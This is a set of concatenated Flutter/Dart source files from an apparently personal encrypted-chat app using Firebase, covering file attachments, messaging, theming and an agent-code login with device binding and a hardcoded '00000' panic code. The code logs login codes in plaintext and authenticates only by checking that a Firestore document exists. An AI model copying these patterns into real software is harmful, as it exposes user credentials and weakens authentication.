            onAttachmentPressed: () async {
              final apiService = ref.read(apiServiceProvider);
              if (apiService == null) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "ApiService is null. Cannot send attachment.");
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال المرفقات غير متاحة",
                          style: GoogleFonts.cairo())));
                }
                return;
              }
              try {
                FilePickerResult? result = await FilePicker.platform.pickFiles(
                  type: FileType.any, 
                  withData: true, // Ensure file bytes are loaded for MIME type detection and upload
                );
                if (result != null && result.files.isNotEmpty) {
                  PlatformFile file = result.files.first;
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Picked file: ${file.name}, size: ${file.size}");

                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Row(
                            children: [
                              SizedBox(
                                width: 20, 
                                height: 20, 
                                child: CircularProgressIndicator(
                                  strokeWidth: 2, 
                                  color: Colors.white
                                )
                              ),
                              const SizedBox(width: 12),
                              Text("جارٍ رفع الملف: ${file.name}...",
                                  style: GoogleFonts.cairo()),
                            ],
                          ),
                          duration: const Duration(seconds: 15),
                          backgroundColor: theme.primaryColor,
                      ),
                    );
                  }

                  String? downloadUrl = await apiService.uploadFileToStorage(file, widget.conversationId);
                  
                  if (!context.mounted) return; // Check mounted status after async operation

                  // إغلاق SnackBar الرفع
                  ScaffoldMessenger.of(context).hideCurrentSnackBar();

                  if (downloadUrl == null) {
                     logger.error("ChatScreen:onAttachmentPressed", "Upload failed for ${file.name}");
                     ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                            content: Text("فشل رفع الملف: ${file.name}",
                                style: GoogleFonts.cairo()),
                            backgroundColor: Colors.redAccent,
                        ),
                      );
                    return;
                  }
                  
                  logger.info("ChatScreen:onAttachmentPressed", "File ${file.name} uploaded. URL: $downloadUrl");

                  final newFileMessage = ChatMessage(
                    id: "",
                    senderId: currentAgentCode,
                    text: null, 
                    fileName: file.name,
                    fileUrl: downloadUrl, 
                    fileSize: file.size,
                    messageType: _determineMessageTypeFromFile(file),
                    timestamp: DateTime.now(),
                    isSentByCurrentUser: true,
                  );
                  await apiService.sendMessage(widget.conversationId, newFileMessage);
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Sent file message: ${file.name}");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Text("تم إرسال الملف: ${file.name}",
                              style: GoogleFonts.cairo())),
                    );
                  }
                } else {
                  logger.info("ChatScreen:onAttachmentPressed",
                      "File picking cancelled or no file selected.");
                }
              } catch (e, stackTrace) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "Error picking or sending file", e, stackTrace);
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Text("حدث خطأ أثناء معالجة الملف، يرجى المحاولة مرة أخرى",
                        style: GoogleFonts.cairo()),
                    backgroundColor: Colors.redAccent,
                  ));
                }
              }
            },
          ),
        ],
      ),
    );
  }
}


// ------------------------------ نهاية الملف: chat_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_service.dart
// ----------------------------------------------------------------------

// import 'package:flutter_riverpod/flutter_riverpod.dart';
// import 'package:uuid/uuid.dart';

// import '../../data/models/chat/chat_conversation.dart';
// import '../../data/models/chat/chat_message.dart';

// class ChatService {
//   final List<ChatConversation> _conversations = [];
//   final Map<String, List<ChatMessage>> _messages = {};
//   final Uuid _uuid = const Uuid();

//   // Get all chat conversations
//   List<ChatConversation> getConversations() {
//     return _conversations;
//   }

//   // Get messages for a specific conversation
//   List<ChatMessage> getMessages(String conversationId) {
//     return _messages[conversationId] ?? [];
//   }

//   // Add a new message to a conversation
//   void addMessage(String conversationId, ChatMessage message) {
//     if (_messages.containsKey(conversationId)) {
//       _messages[conversationId]!.add(message);
//     } else {
//       _messages[conversationId] = [message];
//     }
//   }

//   // Create a new conversation
//   ChatConversation createConversation(String userId, String userName) {
//     final newConversation = ChatConversation(
//       id: _uuid.v4(),
//       userName: userName,
//       lastMessage: '', // Initialize with empty last message
//       timestamp: DateTime.now(),
//     );
//     _conversations.add(newConversation);
//     return newConversation;
//   }
// }

// final chatServiceProvider = Provider((ref) => ChatService());



// ------------------------------ نهاية الملف: chat_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: firebase_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\firebase\firebase_service.dart
// ----------------------------------------------------------------------

import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:file_picker/file_picker.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:uuid/uuid.dart';

import '../../../data/models/chat/chat_conversation.dart';
import '../../../data/models/chat/chat_message.dart';

class FirebaseService {
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  final FirebaseStorage _storage = FirebaseStorage.instance;
  final _uuid = Uuid();

  // Initialize Firebase (called after google-services.json is added and Firebase.initializeApp())
  Future<void> initialize() async {
    print(
        "FirebaseService initialized. Ensure Firebase.initializeApp() was called.");
  }

  // User operations
  Future<void> createUserRecord(String userId,
      {Map<String, dynamic>? userData}) async {
    try {
      await _firestore.collection('users').doc(userId).set({
        'userId': userId,
        'createdAt': FieldValue.serverTimestamp(),
        'lastSeen': FieldValue.serverTimestamp(),
        ...?userData,
      });
    } catch (e) {
      print("Error creating user record: $e");
      // Handle error appropriately
    }
  }

  Future<Map<String, dynamic>?> getUserRecord(String userId) async {
    try {
      DocumentSnapshot doc =
          await _firestore.collection('users').doc(userId).get();
      if (doc.exists) {
        return doc.data() as Map<String, dynamic>;
      }
    } catch (e) {
      print("Error fetching user record: $e");
    }
    return null;
  }

  // Chat operations
  Stream<List<ChatConversation>> getChatsStream(String userId) {
    return _firestore
        .collection('chats')
        .where('participants', arrayContains: userId)
        .orderBy('updatedAt', descending: true)
        .snapshots()
        .map((snapshot) => snapshot.docs.map((doc) {
              final data = doc.data();
              return ChatConversation.fromMap({
                'id': doc.id,
                'title': data['title'] ?? 'محادثة جديدة',
                'participants': List<String>.from(data['participants'] ?? []),
                'lastMessage': data['lastMessage'],
                'createdAt': data['createdAt']?.toDate(),
                'updatedAt': data['updatedAt']?.toDate(),
              });
            }).toList());
  }

  Future<String?> createChat(List<String> participantIds,
      {String? title}) async {
    try {
      // Sort participant IDs to create a consistent chat ID
      participantIds.sort();
      String chatId =
          participantIds.join('_'); // Simple way to generate a chat ID

      // Check if chat already exists
      DocumentSnapshot chatDoc =
          await _firestore.collection('chats').doc(chatId).get();
      if (chatDoc.exists) {
        return chatId; // Chat already exists
      }

      await _firestore.collection('chats').doc(chatId).set({
        'participants': participantIds,
        'title': title ?? 'محادثة جديدة',
        'createdAt': FieldValue.serverTimestamp(),
        'updatedAt': FieldValue.serverTimestamp(),
      });
      return chatId;
    } catch (e) {
      print("Error creating chat: $e");
    }
    return null;
  }

  // Message operations
  Stream<List<ChatMessage>> getMessagesStream(String chatId) {
    return _firestore
        .collection('chats')
        .doc(chatId)
        .collection('messages')
        .orderBy('timestamp',
            descending: true) // Or false for chronological order
        .snapshots()
        .map((snapshot) => snapshot.docs.map((doc) {
              final data = doc.data();
              return ChatMessage(
                id: doc.id,
                senderId: data['senderId'] ?? '',
                text: data['text'],
                fileUrl: data['fileUrl'],
                fileName: data['fileName'],
                fileSize: data['fileSize'],
                messageType:
                    _getMessageTypeFromString(data['messageType'] ?? 'text'),
                timestamp: data['timestamp']?.toDate() ?? DateTime.now(),
                isSentByCurrentUser: false, // Will be set by the UI
              );
            }).toList());
  }

  MessageType _getMessageTypeFromString(String type) {
    switch (type) {
      case 'image':
        return MessageType.image;
      case 'video':
        return MessageType.video;
      case 'audio':
        return MessageType.audio;
      case 'file':
        return MessageType.file;
      default:
        return MessageType.text;
    }
  }

  String _getStringFromMessageType(MessageType type) {
    switch (type) {
      case MessageType.image:
        return 'image';
      case MessageType.video:
        return 'video';
      case MessageType.audio:
        return 'audio';
      case MessageType.file:
        return 'file';
      default:
        return 'text';
    }
  }

  Future<void> sendMessage(String chatId, ChatMessage message) async {
    try {
      final messageId = message.id.isEmpty ? _uuid.v4() : message.id;

      await _firestore
          .collection('chats')
          .doc(chatId)
          .collection('messages')
          .doc(messageId)
          .set({
        'senderId': message.senderId,
        'text': message.text,
        'fileUrl': message.fileUrl,
        'fileName': message.fileName,
        'fileSize': message.fileSize,
        'messageType': _getStringFromMessageType(message.messageType),
        'timestamp': FieldValue.serverTimestamp(),
        'isRead': false,
      });

      // Update chat's last message and updatedAt timestamp
      await _firestore.collection('chats').doc(chatId).update({
        'lastMessage': {
          'text': message.text ?? message.fileName ?? 'مرفق',
          'timestamp': FieldValue.serverTimestamp(),
          'senderId': message.senderId,
        },
        'updatedAt': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      print("Error sending message: $e");
      rethrow;
    }
  }

  Future<String?> uploadFileToStorage(PlatformFile file, String chatId) async {
    try {
      if (file.bytes == null && file.path == null) {
        throw Exception("No file data available");
      }

      final fileName = '${DateTime.now().millisecondsSinceEpoch}_${file.name}';
      final storageRef = _storage.ref().child('chats/$chatId/$fileName');

      UploadTask uploadTask;
      if (file.bytes != null) {
        // Upload from memory
        uploadTask = storageRef.putData(file.bytes!);
      } else {
        // Upload from file path
        final fileToUpload = File(file.path!);
        uploadTask = storageRef.putFile(fileToUpload);
      }

      final snapshot = await uploadTask;
      final downloadUrl = await snapshot.ref.getDownloadURL();
      return downloadUrl;
    } catch (e) {
      print("Error uploading file: $e");
      return null;
    }
  }

  Future<void> deleteMessage(String chatId, String messageId) async {
    try {
      await _firestore
          .collection('chats')
          .doc(chatId)
          .collection('messages')
          .doc(messageId)
          .delete();
      // Potentially update lastMessage in chat if this was the last one
    } catch (e) {
      print("Error deleting message: $e");
    }
  }

  Future<void> deleteConversation(String chatId) async {
    try {
      // Delete all messages in the conversation (subcollection)
      var messagesSnapshot = await _firestore
          .collection('chats')
          .doc(chatId)
          .collection('messages')
          .get();
      for (var doc in messagesSnapshot.docs) {
        await doc.reference.delete();
      }
      // Delete the chat document itself
      await _firestore.collection('chats').doc(chatId).delete();
    } catch (e) {
      print("Error deleting conversation: $e");
    }
  }

  Future<void> updateUserLastSeen(String userId) async {
    try {
      await _firestore.collection('users').doc(userId).update({
        'lastSeen': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      print("Error updating user last seen: $e");
    }
  }
}



// ------------------------------ نهاية الملف: firebase_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: auth_providers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\providers\auth_providers.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/providers/auth_providers.dart
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

import '../../../core/logging/logger_provider.dart';

const String agentCodeStorageKey = 'conduit_current_agent_code_v1';

final _secureStorageInstanceProvider = Provider<FlutterSecureStorage>((ref) {
  return const FlutterSecureStorage();
});

final currentAgentCodeProvider = FutureProvider<String?>((ref) async {
  final storage = ref.watch(_secureStorageInstanceProvider);
  final logger = ref.watch(appLoggerProvider);
  logger.info("currentAgentCodeProvider", "Attempting to read agent code with key: $agentCodeStorageKey");
  try {
    final agentCode = await storage.read(key: agentCodeStorageKey);
    if (agentCode != null && agentCode.isNotEmpty) {
      logger.info("currentAgentCodeProvider", "Successfully read agent code: '$agentCode'");
      return agentCode;
    } else {
      logger.info("currentAgentCodeProvider", "No agent code found (null or empty).");
      return null;
    }
  } catch (e, stackTrace) {
    logger.error("currentAgentCodeProvider", "Error reading agent code.", e, stackTrace);
    return null;
  }
});

final isLoggedInProvider = Provider<bool>((ref) {
  final agentCodeAsyncValue = ref.watch(currentAgentCodeProvider);
  return agentCodeAsyncValue.maybeWhen(
    data: (agentCode) => agentCode != null && agentCode.isNotEmpty,
    orElse: () => false,
  );
});

final secureStorageProviderForDecoy = _secureStorageInstanceProvider;

// Define AuthService class
class AuthService {
  final Ref _ref;
  AuthService(this._ref);

  Future<void> signOut() async {
    final logger = _ref.read(appLoggerProvider);
    final storage = _ref.read(secureStorageProviderForDecoy);
    try {
      await storage.delete(key: agentCodeStorageKey);
      _ref.invalidate(currentAgentCodeProvider);
      // In a real app, you might also call Firebase Auth signOut or similar here.
      logger.info("AuthService", "User signed out, agent code deleted.");
    } catch (e, s) {
      logger.error("AuthService", "Error during sign out", e, s);
      // Rethrow to allow callers to handle
      rethrow;
    }
  }

  // Add other auth methods here if needed, e.g., signIn, signUp
  Future<void> signIn(String agentCode) async {
    final logger = _ref.read(appLoggerProvider);
    final storage = _ref.read(secureStorageProviderForDecoy);
    try {
      await storage.write(key: agentCodeStorageKey, value: agentCode);
      _ref.invalidate(currentAgentCodeProvider); // Invalidate to refetch
      logger.info("AuthService", "Agent code '$agentCode' signed in and stored.");
    } catch (e, s) {
      logger.error("AuthService", "Error during sign in for '$agentCode'", e, s);
      rethrow;
    }
  }
}

// Define and export authServiceProvider
final authServiceProvider = Provider<AuthService>((ref) {
  return AuthService(ref);
});



// ------------------------------ نهاية الملف: auth_providers.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_providers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\providers\chat_providers.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/providers/chat_providers.dart
import "package:cloud_firestore/cloud_firestore.dart";
import "package:firebase_storage/firebase_storage.dart"; // Import Firebase Storage
import "package:flutter_riverpod/flutter_riverpod.dart";

import "../../../core/logging/logger_provider.dart";
import "../../../data/models/chat/chat_conversation.dart";
import "../../../data/models/chat/chat_message.dart";
import "../api_service.dart";
import "auth_providers.dart"; // لـ currentAgentCodeProvider

// Provider لـ ApiService - سيكون null حتى يتوفر agentCode
final apiServiceProvider = Provider<ApiService?>((ref) {
  final firestore = FirebaseFirestore.instance;
  final storage = FirebaseStorage.instance; // Add Firebase Storage instance
  final logger =
      ref.watch(appLoggerProvider); // استخدام appLoggerProvider العام
  final agentCodeAsync = ref.watch(currentAgentCodeProvider);

  return agentCodeAsync.when(
    data: (agentCode) {
      if (agentCode != null && agentCode.isNotEmpty) {
        logger.info("apiServiceProvider",
            "Agent code available: $agentCode. Initializing ApiService.");
        // Ensure correct argument order: firestore, storage, logger, agentCode
        return ApiService(firestore, storage, logger, agentCode);
      }
      logger.warn("apiServiceProvider",
          "Agent code is null or empty. ApiService will not be available yet.");
      return null;
    },
    loading: () {
      logger.info("apiServiceProvider",
          "Agent code is loading... ApiService not yet available.");
      return null;
    },
    error: (error, stackTrace) {
      logger.error(
          "apiServiceProvider", "Error loading agent code", error, stackTrace);
      return null;
    },
  );
});

// StreamProvider للمحادثات
final chatConversationsStreamProvider =
    StreamProvider<List<ChatConversation>>((ref) {
  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
  final logger = ref.watch(appLoggerProvider);
  final firestore = FirebaseFirestore.instance;
  final storage = FirebaseStorage.instance; // Add Firebase Storage instance

  return agentCodeAsync.when(
    data: (agentCode) {
      if (agentCode != null && agentCode.isNotEmpty) {
        final apiService =
            ref.read(apiServiceProvider); 
        if (apiService != null) {
          return apiService.getConversationsStream();
        }
        logger.warn("chatConversationsStreamProvider",
            "ApiService was null but agentCode is $agentCode. Creating temp instance.");
        // Ensure correct argument order: firestore, storage, logger, agentCode
        final tempApiService = ApiService(firestore, storage, logger, agentCode);
        return tempApiService.getConversationsStream();
      }
      logger.info("chatConversationsStreamProvider",
          "No agent code, returning empty stream for conversations.");
      return Stream.value([]);
    },
    loading: () {
      logger.info("chatConversationsStreamProvider",
          "Agent code loading, returning empty stream for conversations.");
      return Stream.value([]);
    },
    error: (e, s) {
      logger.error(
          "chatConversationsStreamProvider",
          "Error with agent code, returning error stream for conversations.",
          e,
          s);
      return Stream.error(e, s);
    },
  );
});

// StreamProvider للرسائل
final chatMessagesStreamProvider = StreamProvider.autoDispose
    .family<List<ChatMessage>, String>((ref, conversationId) {
  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
  final logger = ref.watch(appLoggerProvider);
  final firestore = FirebaseFirestore.instance;
  final storage = FirebaseStorage.instance; // Add Firebase Storage instance

  return agentCodeAsync.when(
    data: (agentCode) {
      if (agentCode != null && agentCode.isNotEmpty) {
        final apiService = ref.read(apiServiceProvider);
        if (apiService != null) {
          return apiService.getMessagesStream(conversationId);
        }
        logger.warn("chatMessagesStreamProvider",
            "ApiService was null for $conversationId but agentCode is $agentCode. Creating temp instance.");
        // Ensure correct argument order: firestore, storage, logger, agentCode
        final tempApiService = ApiService(firestore, storage, logger, agentCode);
        return tempApiService.getMessagesStream(conversationId);
      }
      logger.info("chatMessagesStreamProvider",
          "No agent code, returning empty stream for messages in $conversationId.");
      return Stream.value([]);
    },
    loading: () {
      logger.info("chatMessagesStreamProvider",
          "Agent code loading, returning empty stream for messages in $conversationId.");
      return Stream.value([]);
    },
    error: (e, s) {
      logger.error(
          "chatMessagesStreamProvider",
          "Error with agent code, returning error stream for messages in $conversationId.",
          e,
          s);
      return Stream.error(e, s);
    },
  );
});




// ------------------------------ نهاية الملف: chat_providers.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: theme_providers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\providers\theme_providers.dart
// ----------------------------------------------------------------------

// lib/presentation/providers/theme_providers.dart
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../../core/settings/theme_service.dart';

// Provider for ThemeService
final themeServiceProvider = Provider<ThemeService>((ref) {
  return ThemeService(); // إنشاء instance من ThemeService
});

// StateNotifierProvider for managing theme state
final themeStateProvider =
    StateNotifierProvider<ThemeNotifier, ThemeState>((ref) {
  // تمرير ThemeService إلى ThemeNotifier
  return ThemeNotifier(ref.watch(themeServiceProvider));
});

class ThemeState {
  final ThemeMode themeMode;
  final Color primaryColor;
  final bool useMaterial3;

  ThemeState({
    required this.themeMode,
    required this.primaryColor,
    required this.useMaterial3,
  });

  // يمكنك حذف dialogBackgroundColor من هنا إذا كنت ستعتمد على ألوان الثيم مباشرة
  // Color get dialogBackgroundColor =>
  //     themeMode == ThemeMode.dark ? const Color(0xFF2C2C2C) : Colors.grey[200]!;

  ThemeState copyWith({
    ThemeMode? themeMode,
    Color? primaryColor,
    bool? useMaterial3,
  }) {
    return ThemeState(
      themeMode: themeMode ?? this.themeMode,
      primaryColor: primaryColor ?? this.primaryColor,
      useMaterial3: useMaterial3 ?? this.useMaterial3,
    );
  }
}

class ThemeNotifier extends StateNotifier<ThemeState> {
  final ThemeService _themeService;
  // اللون الافتراضي يمكن أن يكون من ThemeService أيضًا إذا أردت
  // static const Color intelligencePrimaryColor = Color(0xFF004D40);

  ThemeNotifier(this._themeService) // استقبال ThemeService
      : super(ThemeState(
          themeMode: ThemeMode.system, // القيمة الافتراضية قبل التحميل
          primaryColor: ThemeService
              .intelligencePrimaryColor, // استخدام اللون الافتراضي من ThemeService
          useMaterial3: true, // القيمة الافتراضية قبل التحميل
        )) {
    _loadSettings();
  }

  Future<void> _loadSettings() async {
    final themeMode = await _themeService.loadThemeMode();
    // استخدام دالة loadPrimaryColor من ThemeService التي توفر اللون الافتراضي
    final primaryColor = await _themeService.loadPrimaryColor();
    final useMaterial3 = await _themeService.loadUseMaterial3();

    if (mounted) {
      state = ThemeState(
        themeMode: themeMode,
        primaryColor: primaryColor,
        useMaterial3: useMaterial3,
      );
    }
  }

  void updateThemeMode(ThemeMode mode) {
    if (mode == state.themeMode) return;
    state = state.copyWith(themeMode: mode);
    _themeService.saveThemeMode(mode);
  }

  void updatePrimaryColor(Color color) {
    if (color == state.primaryColor) return;
    state = state.copyWith(primaryColor: color);
    _themeService.savePrimaryColor(color);
  }

  void toggleMaterial3(bool useMaterial3) {
    if (useMaterial3 == state.useMaterial3) return;
    state = state.copyWith(useMaterial3: useMaterial3);
    _themeService.saveUseMaterial3(useMaterial3);
  }
}



// ------------------------------ نهاية الملف: theme_providers.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: auth_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\services\auth_service.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/services/auth_service.dart
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'dart:io' if (dart.library.html) 'dart:html' show Platform;

import '../../../core/logging/logger_service.dart';
import '../../../core/security/secure_storage_service.dart';

/// خدمة المصادقة المخصصة للتعامل مع رموز الوكلاء
class AuthService {
  final FirebaseFirestore _firestore;
  final LoggerService _logger;
  final SecureStorageService _secureStorage;

  AuthService(this._firestore, this._logger, this._secureStorage);

  /// التحقق من صحة رمز الوكيل مقابل Firestore
  Future<bool> validateAgentCode(String agentCode) async {
    if (agentCode.isEmpty) {
      _logger.warn("AuthService:validateAgentCode", "محاولة التحقق من رمز وكيل فارغ.");
      return false;
    }
    
    _logger.info("AuthService:validateAgentCode", "التحقق من رمز الوكيل: $agentCode مقابل 'agent_identities'");
    
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCode)
          .get();

      if (doc.exists) {
        _logger.info("AuthService:validateAgentCode", "رمز الوكيل '$agentCode' صالح (المستند موجود).");
        return true;
      } else {
        _logger.warn("AuthService:validateAgentCode", "رمز الوكيل '$agentCode' غير صالح (المستند غير موجود).");
        return false;
      }
    } catch (e, s) {
      _logger.error(
          "AuthService:validateAgentCode",
          "حدث خطأ أثناء التحقق من رمز الوكيل '$agentCode'",
          e,
          s);
      return false;
    }
  }

  /// الحصول على معرف الجهاز
  Future<String?> getDeviceId() async {
    final deviceInfo = DeviceInfoPlugin();
    try {
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        return androidInfo.id;
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        return iosInfo.identifierForVendor;
      }
    } catch (e, s) {
      _logger.error("AuthService:getDeviceId", "فشل في الحصول على معرف الجهاز", e, s);
    }
    return null;
  }

  /// التحقق من رمز الوكيل وربط الجهاز إذا لزم الأمر
  Future<AuthResult> authenticateAgent(String agentCode) async {
    if (agentCode.isEmpty) {
      return AuthResult(
        success: false, 
        message: "الرجاء إدخال الرمز التعريفي",
        errorType: AuthErrorType.emptyCode
      );
    }

    // رقم الهلع - يقوم بإرجاع نجاح مع علامة الهلع
    if (agentCode == "00000") {
      _logger.warn("AuthService:authenticateAgent", "تم إدخال رمز الهلع '00000'! بدء التدمير الذاتي الصامت.");
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح",
        isPanicCode: true
      );
    }

    // التحقق من صحة الرمز
    final isValidCode = await validateAgentCode(agentCode);
    if (!isValidCode) {
      return AuthResult(
        success: false,
        message: "رمز التعريف غير صحيح. يرجى المحاولة مرة أخرى.",
        errorType: AuthErrorType.invalidCode
      );
    }

    // الحصول على معرف الجهاز
    final deviceId = await getDeviceId();
    if (deviceId == null) {
      _logger.error("AuthService:authenticateAgent", "فشل في الحصول على معرف الجهاز. إحباط تسجيل الدخول.");
      return AuthResult(
        success: false,
        message: "فشل في تحديد هوية الجهاز. لا يمكن المتابعة.",
        errorType: AuthErrorType.deviceIdError
      );
    }

    // الحصول على بيانات الوكيل
    final agentDocRef = _firestore.collection("agent_identities").doc(agentCode);
    final agentDocSnapshot = await agentDocRef.get();

    if (!agentDocSnapshot.exists) {
      _logger.error("AuthService:authenticateAgent", "رمز الوكيل $agentCode صالح ولكن المستند غير موجود. تناقض حرج.");
      return AuthResult(
        success: false,
        message: "خطأ في بيانات العميل.",
        errorType: AuthErrorType.dataInconsistency
      );
    }

    final agentData = agentDocSnapshot.data()!;
    final storedDeviceId = agentData["deviceId"] as String?;
    final isDeviceBindingRequired = agentData["deviceBindingRequired"] as bool? ?? true;
    final bool needsAdminApprovalForNewDevice = agentData["needsAdminApprovalForNewDevice"] as bool? ?? false;

    // التحقق من ربط الجهاز
    if (!isDeviceBindingRequired) {
      _logger.info("AuthService:authenticateAgent", "ربط الجهاز غير مطلوب لـ $agentCode.");
      // تخزين رمز الوكيل في التخزين الآمن
      await _secureStorage.writeAgentCode(agentCode);
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح"
      );
    } else if (storedDeviceId == null) {
      if (needsAdminApprovalForNewDevice) {
        _logger.info("AuthService:authenticateAgent", "أول تسجيل دخول لـ $agentCode على الجهاز $deviceId. مطلوب موافقة المسؤول.");
        return AuthResult(
          success: false,
          message: "هذا الجهاز جديد لهذا الرمز. يرجى انتظار موافقة المسؤول أو مراجعته.",
          errorType: AuthErrorType.needsAdminApproval
        );
      } else {
        _logger.info("AuthService:authenticateAgent", "أول تسجيل دخول لـ $agentCode على الجهاز $deviceId. ربط الجهاز تلقائيًا.");
        await agentDocRef.update({
          "deviceId": deviceId,
          "lastLoginAt": FieldValue.serverTimestamp(),
          "lastLoginDeviceId": deviceId
        });
        // تخزين رمز الوكيل في التخزين الآمن
        await _secureStorage.writeAgentCode(agentCode);
        return AuthResult(
          success: true,
          message: "تم التحقق بنجاح وربط الجهاز"
        );
      }
    } else if (storedDeviceId == deviceId) {
      _logger.info("AuthService:authenticateAgent", "تطابق معرف الجهاز لـ $agentCode: $deviceId");
      await agentDocRef.update({
        "lastLoginAt": FieldValue.serverTimestamp(),
        "lastLoginDeviceId": deviceId
      });
      // تخزين رمز الوكيل في التخزين الآمن
      await _secureStorage.writeAgentCode(agentCode);
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح"
      );
    } else {
      _logger.warn("AuthService:authenticateAgent", "عدم تطابق معرف الجهاز لـ $agentCode. المتوقع: $storedDeviceId، الحالي: $deviceId");
      return AuthResult(
        success: false,
        message: "هذا الجهاز غير مصرح له باستخدام هذا الرمز.",
        errorType: AuthErrorType.deviceMismatch
      );
    }
  }

  /// تسجيل الخروج وحذف رمز الوكيل من التخزين الآمن
  Future<void> logout() async {
    await _secureStorage.deleteAgentCode();
    _logger.info("AuthService:logout", "تم تسجيل الخروج وحذف رمز الوكيل من التخزين الآمن");
  }

  /// التحقق مما إذا كان المستخدم مسجل الدخول
  Future<bool> isLoggedIn() async {
    final agentCode = await _secureStorage.readAgentCode();
    return agentCode != null && agentCode.isNotEmpty;
  }

  /// الحصول على رمز الوكيل الحالي
  Future<String?> getCurrentAgentCode() async {
    return await _secureStorage.readAgentCode();
  }
}

/// نتيجة عملية المصادقة
class AuthResult {
  final bool success;
  final String message;
  final AuthErrorType? errorType;
  final bool isPanicCode;

  AuthResult({
    required this.success,
    required this.message,
    this.errorType,
    this.isPanicCode = false
  });
}

/// أنواع أخطاء المصادقة
enum AuthErrorType {
  emptyCode,
  invalidCode,
  deviceIdError,
  dataInconsistency,
  needsAdminApproval,
  deviceMismatch
}

/// مزود خدمة المصادقة
final authServiceProvider = Provider<AuthService>((ref) {
  final firestore = FirebaseFirestore.instance;
  final logger = ref.watch(loggerServiceProvider);
  final secureStorage = ref.watch(secureStorageServiceProvider);
  return AuthService(firestore, logger, secureStorage);
});

/// مزود خدمة LoggerService
final loggerServiceProvider = Provider<LoggerService>((ref) {
  return LoggerService("AuthService");
});



// ------------------------------ نهاية الملف: auth_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: conversation_view_model.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\view_models\conversation_view_model.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/view_models/conversation_view_model.dart
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../../data/models/chat/chat_conversation.dart';
import '../../../data/repositories/firestore_repository.dart';
import 'message_view_model.dart';

/// نموذج عرض للمحادثات يتبع نمط MVVM
class ConversationViewModel extends StateNotifier<AsyncValue<List<ChatConversation>>> {
  final FirestoreRepository _repository;
  
  ConversationViewModel(this._repository) : super(const AsyncValue.loading()) {
    // بدء الاستماع لتدفق المحادثات
    _listenToConversations();
  }

  /// بدء الاستماع لتدفق المحادثات
  void _listenToConversations() {
    _repository.getConversationsStream().listen(
      (conversations) {
        // تحديث الحالة بالمحادثات الجديدة
        state = AsyncValue.data(conversations);
      },
      onError: (error, stackTrace) {
        // تحديث الحالة بالخطأ
        state = AsyncValue.error(error, stackTrace);
      }
    );
  }

  /// إنشاء محادثة جديدة أو الحصول على محادثة موجودة
  Future<String?> createOrGetConversation(
    List<String> participantAgentCodes,
    Map<String, ChatParticipantInfo> participantInfoMap,
    {String? groupTitle}
  ) async {
    return _repository.createOrGetConversation(
      participantAgentCodes,
      participantInfoMap,
      groupTitle: groupTitle
    );
  }
}

/// مزود لنموذج عرض المحادثات
final conversationViewModelProvider = StateNotifierProvider<ConversationViewModel, AsyncValue<List<ChatConversation>>>(
  (ref) {
    // الحصول على مستودع Firestore
    final repository = ref.watch(firestoreRepositoryProvider);
    
    // إنشاء نموذج عرض المحادثات
    return ConversationViewModel(repository);
  }
);



// ------------------------------ نهاية الملف: conversation_view_model.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: message_view_model.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\view_models\message_view_model.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/view_models/message_view_model.dart
import 'package:cloud_firestore/cloud_firestore.dart';
